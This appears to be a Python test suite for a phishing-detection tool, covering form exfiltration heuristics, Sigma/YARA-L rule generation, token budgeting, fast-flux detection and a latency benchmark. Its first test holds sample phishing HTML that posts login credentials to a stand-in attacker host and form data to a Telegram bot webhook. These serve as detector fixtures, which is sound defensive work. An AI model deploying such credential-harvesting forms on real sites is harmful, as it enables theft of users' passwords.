from __future__ import annotations

import os
import sys
import json
from pathlib import Path

sys.path.insert(0, ".")


def test_improvement_1_form_exfiltration():
    print("=== TEST MEJORA 1: Form Credential Exfiltration Heuristic Engine ===")
    from phishguard_content.analyzer import analyze_html

    # Case A: External credential exfiltration (cross-domain password post)
    html_cross = b"""
    <html>
        <body>
            <h1>Login Corporativo</h1>
            <form action="https://attacker-harvester.com/steal.php" method="POST">
                <input type="text" name="user">
                <input type="password" name="pass">
                <button type="submit">Entrar</button>
            </form>
        </body>
    </html>
    """
    res_cross = analyze_html(html_cross, "https://secure-portal.empresa.com/login")
    print(f"Cross-domain form: cred_exfil={res_cross.features['html_credential_exfiltration_count']}, risk_score={res_cross.features['form_exfiltration_risk_score']}")
    assert res_cross.features["html_credential_exfiltration_count"] == 1.0
    assert res_cross.features["form_exfiltration_risk_score"] >= 0.85

    # Case B: Exfiltration to drop service / webhook
    html_webhook = b"""
    <html>
        <body>
            <form action="https://api.telegram.org/bot12345/sendMessage" method="POST">
                <input type="text" name="data">
            </form>
        </body>
    </html>
    """
    res_webhook = analyze_html(html_webhook, "https://my-blog.com/contact")
    print(f"Webhook form: webhook_exfil={res_webhook.features['html_webhook_exfiltration_count']}, risk_score={res_webhook.features['form_exfiltration_risk_score']}")
    assert res_webhook.features["html_webhook_exfiltration_count"] == 1.0
    assert res_webhook.features["form_exfiltration_risk_score"] >= 0.95

    # Case C: Normal legitimate form (same domain)
    html_legit = b"""
    <html>
        <body>
            <form action="/auth/verify" method="POST">
                <input type="password" name="password">
            </form>
        </body>
    </html>
    """
    res_legit = analyze_html(html_legit, "https://secure-portal.empresa.com/login")
    print(f"Legit form: cred_exfil={res_legit.features['html_credential_exfiltration_count']}, risk_score={res_legit.features['form_exfiltration_risk_score']}")
    assert res_legit.features["html_credential_exfiltration_count"] == 0.0
    assert res_legit.features["form_exfiltration_risk_score"] == 0.0
    print("OK: Form credential exfiltration detection verified successfully.")


def test_improvement_2_threat_rules():
    print("\n=== TEST MEJORA 2: Sigma & YARA-L Rule Generator for SOCs ===")
    from phishguard_threat.rule_generator import ThreatRuleGenerator

    job_id = "test-job-987"
    url = "https://paypal-verification.phishing-server.com/login"
    prob = 0.94
    brand = "paypal"
    ips = ["198.51.100.25", "203.0.113.44"]

    # 1. Sigma rule test
    sigma = ThreatRuleGenerator.generate_sigma_rule(job_id, url, prob, brand, ips)
    print("Sigma rule sample snippet:")
    print("\n".join(sigma.splitlines()[:10]))
    assert "title: PhishGuard Malicious Phishing Indicator" in sigma
    assert "c-uri|contains:" in sigma
    assert "paypal-verification.phishing-server.com" in sigma
    assert "dst_ip:" in sigma
    assert "level: critical" in sigma

    # 2. YARA-L rule test
    yaral = ThreatRuleGenerator.generate_yaral_rule(job_id, url, prob, brand, ips)
    print("\nYARA-L rule sample snippet:")
    print("\n".join(yaral.splitlines()[:12]))
    assert "rule phishguard_ioc_" in yaral
    assert '$net.target.hostname = "paypal-verification.phishing-server.com"' in yaral
    assert 'severity = "CRITICAL"' in yaral
    print("OK: Threat intelligence rule generator output confirmed valid.")


def test_improvement_3_budget_and_token_tracker():
    print("\n=== TEST MEJORA 3: Budget & LLM Token Accounting ===")
    from phishguard_api.budget_tracker import ExecutionBudgetTracker

    tracker = ExecutionBudgetTracker(initial_budget_units=3.0)

    # Modality 1: Infrastructure
    tracker.start_modality("infrastructure")
    import time
    time.sleep(0.01)
    tracker.finish_modality("infrastructure", cost_units=1.0)

    # Modality 2: Content with LLM
    tracker.start_modality("content")
    time.sleep(0.01)
    tracker.finish_modality(
        "content",
        cost_units=1.0,
        prompt_tokens=520,
        completion_tokens=110,
        model_name="gemini-1.5-flash"
    )

    summary = tracker.summary()
    print("Budget Tracker Summary:", json.dumps(summary, indent=2))
    assert summary["initial_budget_units"] == 3.0
    assert summary["spent_budget_units"] == 2.0
    assert summary["remaining_budget_units"] == 1.0
    assert summary["total_llm_tokens"] == 630
    assert summary["total_estimated_usd"] > 0.0
    assert "content" in summary["modalities"]
    print("OK: Real budget and token accounting verified successfully.")


def test_improvement_4_fast_flux_detection():
    print("\n=== TEST MEJORA 4: Fast-Flux & ASN/Subnet Dispersion Engine ===")
    from phishguard_infra.analyzer import InfrastructureAnalyzer
    from phishguard_infra.models import HopRecord
    from phishguard_data.psl import PublicSuffixList
    from phishguard_infra.config import InfrastructureConfig
    from phishguard_infra.resolver import SocketResolver
    from phishguard_infra.transport import PinnedHttpTransport

    # Mock hops with 4 IPs in 4 distinct /24 subnets (Fast-Flux signature)
    fast_flux_ips = ("185.220.101.5", "45.154.255.8", "194.26.29.112", "193.32.162.77")
    hop_fast_flux = HopRecord(
        ordinal=0,
        url="http://botnet-fastflux.biz/",
        scheme="http",
        host="botnet-fastflux.biz",
        port=80,
        resolved_addresses=fast_flux_ips,
        pinned_ip="185.220.101.5",
        dns_elapsed_ms=45.0,
        request_elapsed_ms=120.0,
        status_code=200,
        location=None,
        tls=None
    )

    # Instantiate analyzer
    from phishguard_infra.config import load_infrastructure_config
    psl_files = sorted(Path("data/raw").rglob("public_suffix_list.dat"))
    psl = PublicSuffixList.from_file(psl_files[-1])
    config = load_infrastructure_config("configs/infrastructure-analyzer.json")
    analyzer = InfrastructureAnalyzer(config, psl, SocketResolver(), PinnedHttpTransport(config))

    features_ff = analyzer._features([hop_fast_flux])
    print(f"Fast-Flux Hops: slash24_count={features_ff['dns_distinct_slash24_count']}, dispersion={features_ff['dns_subnet_dispersion_ratio']}, fast_flux_prob={features_ff['fast_flux_probability']}")
    assert features_ff["dns_distinct_slash24_count"] == 4.0
    assert features_ff["dns_subnet_dispersion_ratio"] == 1.0
    assert features_ff["fast_flux_probability"] >= 0.70

    # Normal domain with 1 IP
    hop_normal = HopRecord(
        ordinal=0,
        url="http://normal-site.com/",
        scheme="http",
        host="normal-site.com",
        port=80,
        resolved_addresses=("93.184.216.34",),
        pinned_ip="93.184.216.34",
        dns_elapsed_ms=12.0,
        request_elapsed_ms=80.0,
        status_code=200,
        location=None,
        tls=None
    )
    features_norm = analyzer._features([hop_normal])
    print(f"Normal Hop: fast_flux_prob={features_norm['fast_flux_probability']}")
    assert features_norm["fast_flux_probability"] == 0.0
    print("OK: Fast-Flux & Subnet Dispersion Engine verified successfully.")


def test_improvement_5_usability_benchmark():
    print("\n=== TEST MEJORA 5: Usability & Browser Overhead Benchmark ===")
    from tests.benchmark_usability import run_usability_benchmark

    report = run_usability_benchmark(iterations=10)
    assert report["total_inferences"] == 80
    assert report["latency_metrics_ms"]["p50_median"] < 100.0, "p50 latency should be well under 100ms"
    assert report["usability_evaluation"]["compliance_percentage"] > 80.0
    print(f"OK: Benchmark completed with p50 = {report['latency_metrics_ms']['p50_median']} ms, compliance = {report['usability_evaluation']['compliance_percentage']}%.")


if __name__ == "__main__":
    test_improvement_1_form_exfiltration()
    test_improvement_2_threat_rules()
    test_improvement_3_budget_and_token_tracker()
    test_improvement_4_fast_flux_detection()
    test_improvement_5_usability_benchmark()
    print("\n>>> ALL 5 DIFFERENTIATING IMPROVEMENTS VERIFIED AND PASSING SUCCESSFULLY! <<<")
